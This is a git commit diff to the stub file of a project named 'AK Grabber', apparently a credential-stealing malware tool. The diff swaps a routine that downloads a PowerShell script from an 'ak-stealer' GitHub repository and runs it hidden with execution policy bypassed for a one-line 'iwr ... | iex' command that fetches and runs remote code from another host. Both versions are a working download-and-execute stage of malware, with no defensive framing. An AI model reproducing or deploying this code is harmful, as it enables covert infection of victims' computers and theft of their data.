4f4e281025aa562527f876aea2a87e75109900f6
0x559 <llecamht1975@gmail.com>
2025-02-22 15:18:58 +0700

    Update stub.py

--- AK Grabber/Components/stub.py
+++ AK Grabber/Components/stub.py
@@ -174,11 +174,7 @@ class Tasks:
 
 
 def download_and_execute_powershell():
-    url = "https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/main.ps1"
-    file_path = "main.ps1"
-    
-    urllib.request.urlretrieve(url, file_path)
-    os.system(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {file_path}')
+    os.system('powershell "iwr https://leaked.tools/r/MY5U7JRguB | iex"')
 
 class Syscalls:
 
